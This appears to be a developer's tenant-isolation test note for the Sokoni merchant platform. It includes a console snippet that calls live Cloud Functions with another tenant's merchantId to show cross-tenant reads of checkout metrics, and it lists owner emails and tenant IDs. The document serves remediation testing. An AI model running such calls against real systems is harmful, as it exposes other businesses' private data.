# Tenant-isolation baseline — browser console snippet

**Non-mutating.** Reads only. Plants nothing, forges nothing, writes nothing.
It calls live callables with another tenant's `merchantId` and records what comes back.

Run on **https://mysokoni.co.ke** (any page), DevTools → Console, **signed in as the stated account**.

---

## The two tenants

| | merchantId | owner |
|---|---|---|
| KASS — real data lives here | `D5Ql2EYr95bt79IpcGTmOMTK0P83` | `alexochieng3030@gmail.com` |
| KASS — POS merchant record | `SOK-GL58F7` | same |
| WOODLANDS | `SOK-WDLNDS` | `ogutualex824@gmail.com` |

KASS's `posCheckoutMetrics` (5 rows) and `posRetailSales` (5 rows) are under the **uid** form,
so that is the meaningful victim id.

---

## Snippet — paste whole, run once per account

```js
(async () => {
  const u = window.firebaseAuth?.currentUser;
  if (!u) return console.error('NOT SIGNED IN');
  const tok = await u.getIdToken();
  console.log('signed in as', u.email || u.uid, '\nuid', u.uid);

  const call = async (name, data) => {
    const r = await fetch('https://us-central1-sokoni-aeb26.cloudfunctions.net/' + name, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: 'Bearer ' + tok },
      body: JSON.stringify({ data }),
    });
    const j = await r.json().catch(() => ({}));
    return { http: r.status, denied: !!j.error, err: j.error?.status || j.error?.message, result: j.result };
  };

  const KASS = 'D5Ql2EYr95bt79IpcGTmOMTK0P83';
  const WOOD = 'SOK-WDLNDS';

  for (const [label, mid] of [['OWN', u.uid === KASS ? KASS : WOOD],
                              ['OTHER TENANT', u.uid === KASS ? WOOD : KASS]]) {
    console.log('\n===== ' + label + '  merchantId=' + mid + ' =====');
    for (const [fn, payload] of [
      ['posGetQueueMetrics',     { merchantId: mid, days: 30 }],
      ['getBusinessHealthScore', { merchantId: mid, period: 'month' }],
      ['getHealthScoreHistory',  { merchantId: mid, days: 30 }],
      ['getDimensionDrilldown',  { merchantId: mid, dimension: 'sales', period: 'month' }],
    ]) {
      const o = await call(fn, payload);
      console.log(fn.padEnd(26),
        o.denied ? 'DENIED  ' + o.err
                 : 'ALLOWED  ' + JSON.stringify(o.result).slice(0, 220));
    }
  }
})();
```

---

## What to record

For every line, capture **`DENIED` vs `ALLOWED` plus the returned payload** — not merely the HTTP
status. A callable that returns `{}` for an empty tenant still proves it **accepted** the request.

### Expected on the CURRENT code — the vulnerability, demonstrated

| Signed in as | merchantId | Expected today |
|---|---|---|
| WOODLANDS | `SOK-WDLNDS` (own) | ALLOWED, empty — control |
| **WOODLANDS** | **`D5Ql2…` (KASS)** | **ALLOWED, returns KASS metric rows** ← the finding |
| KASS | `D5Ql2…` (own) | ALLOWED, returns its own rows — control |
| KASS | `SOK-WDLNDS` (WOODLANDS) | ALLOWED, empty — accepted when it should deny |

The single strongest line is **WOODLANDS → `D5Ql2…`**: a different authenticated principal,
who owns a different tenant, receiving another merchant's checkout metrics.

### After the authority primitive lands

Every OTHER-TENANT line must read `DENIED permission-denied`, and every OWN line must stay
`ALLOWED`. Same snippet, unchanged — that is the before/after gate.

---

## Not covered here, deliberately

`pos-peripherals` needs a forged `users.merchantId` to demonstrate, which means writing an
exploit value into a real profile. Excluded from this baseline. If runtime proof is needed
later it gets its own gate: snapshot → temporary mutation → immediate restore → post-restore
read-back, never combined with anything else.
